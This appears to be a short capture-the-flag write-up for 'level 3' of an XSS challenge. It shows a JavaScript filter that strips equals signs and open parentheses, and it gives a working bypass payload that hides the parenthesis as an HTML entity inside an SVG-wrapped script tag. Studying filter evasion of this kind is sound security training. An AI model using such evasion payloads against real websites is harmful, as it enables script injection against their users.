# level 3

```js
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}        
```
Here open paranthesis and equal to sign are being replaced, here the payload was ```<svg><script>prompt&#40;1)</script>``` Here the payload won't work without the svg tag as the contents inside the svg tag is supposed to be xml and js engine would parse &#40; to ( during execution.
